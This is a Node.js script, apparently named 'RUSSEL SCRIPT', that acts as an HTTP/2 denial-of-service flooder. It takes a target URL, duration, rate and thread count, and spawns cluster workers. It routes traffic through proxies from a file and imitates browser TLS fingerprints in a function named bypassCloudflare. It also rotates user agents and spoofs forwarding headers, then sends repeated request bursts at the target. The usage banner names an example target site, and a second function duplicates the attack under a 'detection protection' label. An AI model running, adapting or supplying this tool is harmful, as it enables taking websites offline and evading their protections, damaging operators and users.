const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log(`\x1b[42m\x1b[30m    ┌────────────────────────────────┐   \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m    |    RUSSEL SCRIPT  ████  ████    |   \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m    └────────────────────────────────┘   \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m    -------------------------------   \x1b[0m`);
    console.log(`\x1b[41m\x1b[37m    Usage: node RUSSEL.js URL TIME REQ_PER_SEC THREADS   \x1b[0m`);
    console.log(`\x1b[41m\x1b[37m    Example: node RUSSEL.js https://olvidatuex.com 1000 20 10   \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m    -------------------------------   \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m    ┌───────┐    ┌────────────┐    ┌────────┐   \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m    |  /\\  |    |  /\\  \\    |    |   /\\   |   \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m    | /  \\ |    | /  \\  \\   |    |  /  \\  |   \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m    |/    \\|    |/    \\  \\  |    | /    \\ |   \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m    └───────┘    └────────────┘    └────────┘   \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m     ──────────────█─────────────────██─────  \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m     ──────────────█───────────────██─────  \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m     ──────────────██────────────────██─────  \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m     ──────────────██───────────────██─────  \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m     SCRIPT CREADO  POR ANTUAN  \x1b[0m`);
    console.log(`\x1b[42m\x1b[30m     DERECHOS DE AUTOR RESERVADOS   \x1b[0m`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";

const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_client_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

let proxyFile = "proxies.txt";  // Proxies file
let proxies = checkProxies(readLines(proxyFile));
let userAgents = readLines("ua.txt");

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
};

const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.log(`\x1b[32mMaster process started. Spawning ${args.threads} worker threads...\x1b[0m`);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    console.log(`\x1b[32mWorker process ${cluster.worker.id} started.\x1b[0m`);
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 0);
    }
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            console.log(`\x1b[36m[INFO] Connecting to proxy ${options.address}\x1b[0m`);
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                console.error(`\x1b[31m[ERROR] Proxy Error: ${response}\x1b[0m`);
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            console.error(`\x1b[31m[ERROR] Proxy Timeout\x1b[0m`);
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            console.error(`\x1b[31m[ERROR] Proxy Error: ${error}\x1b[0m`);
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function bypassCloudflare(proxyOptions, callback) {
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            console.error(`\x1b[31m[ERROR] Proxy Error: ${error}\x1b[0m`);
            return;
        }

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: { enablePush: false, initialWindowSize: 1073741823 },
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);

        client.on("connect", () => {
            console.log(`\x1b[36m[INFO] Connected to ${parsedTarget.href}\x1b[0m`);
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    const request = client.request(headers).on("response", response => {
                        console.log(`\x1b[36m[INFO] Response: ${response.statusCode} ${response.statusMessage}\x1b[0m`);
                    });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            console.log(`\x1b[36m[INFO] Connection closed.\x1b[0m`);
            client.destroy();
            connection.destroy();
        });

        client.on("error", error => {
            console.error(`\x1b[31m[ERROR] Connection Error: ${error}\x1b[0m`);
            client.destroy();
            connection.destroy();
        });
    });
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    headers[":authority"] = parsedTarget.host;
    headers["user-agent"] = randomElement(userAgents);
    headers["x-forwarded-for"] = parsedProxy[0];

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15
    };

    bypassCloudflare(proxyOptions);
}

function checkProxies(proxyList) {
    const validProxies = [];
    proxyList.forEach(proxy => {
        const [host, port] = proxy.split(":");
        const socket = net.createConnection({ host, port });
        socket.setTimeout(5000);

        socket.on("connect", () => {
            validProxies.push(`${host}:${port}`);
            socket.end();
        });

        socket.on("timeout", () => {
            socket.end();
        });

        socket.on("error", () => {
            socket.end();
        });
    });

    return validProxies;
}

function protectAgainstDetection(proxyOptions, callback) {
    console.log("Implementing Detection Protection...");
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            console.error(`\x1b[31m[ERROR] Proxy Error: ${error}\x1b[0m`);
            return;
        }

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const tlsOptions = {
            port: 443,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: secureProtocol
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: { enablePush: false, initialWindowSize: 1073741823 },
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);

        client.on("connect", () => {
            console.log(`\x1b[36m[INFO] Connected to ${parsedTarget.href}\x1b[0m`);
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    const request = client.request(headers).on("response", response => {
                        console.log(`\x1b[36m[INFO] Response: ${response.statusCode} ${response.statusMessage}\x1b[0m`);
                    });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            console.log(`\x1b[36m[INFO] Connection closed.\x1b[0m`);
            client.destroy();
            connection.destroy();
        });

        client.on("error", error => {
            console.error(`\x1b[31m[ERROR] Connection Error: ${error}\x1b[0m`);
            client.destroy();
            connection.destroy();
        });
    });
}

const KillScript = () => process.exit(1);

process.on('uncaughtException', error => { console.error(`\x1b[31m[ERROR] Uncaught Exception: ${error}\x1b[0m`); });
process.on('unhandledRejection', error => { console.error(`\x1b[31m[ERROR] Unhandled Rejection: ${error}\x1b[0m`); });
